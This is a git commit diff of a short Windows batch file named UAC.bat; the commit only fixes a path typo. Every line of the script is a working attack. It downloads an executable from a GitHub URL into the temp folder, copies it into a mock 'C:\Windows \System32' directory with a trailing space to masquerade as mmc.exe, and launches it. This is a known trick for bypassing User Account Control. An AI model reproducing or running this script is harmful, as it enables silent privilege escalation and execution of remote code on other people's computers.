ed3fb5719972c6d419b57abb0004b8abd9971c3a
Shilpesh Trivedi <tshilpesh@gmail.com>
2020-09-03 17:33:09 +0530

    Update UAC.bat

--- UAC.bat
+++ UAC.bat
@@ -1,3 +1,3 @@
 powershell.exe Import-Module BitsTransfer; Start-BitsTransfer -Source https://github.com/ShilpeshTrivedi/SakalaBoobBoon/blob/master/cmd.exe?raw=true -Destination "$env:TEMP\dos.exe";
-copy "C:\Users\%username%\\AppData\Local\Temp\dos.exe" "\\?\C:\Windows \System32\mmc.exe"
+copy "C:\Users\%username%\AppData\Local\Temp\dos.exe" "\\?\C:\Windows \System32\mmc.exe"
 Start "C:\Windows \System32\mmc.exe"
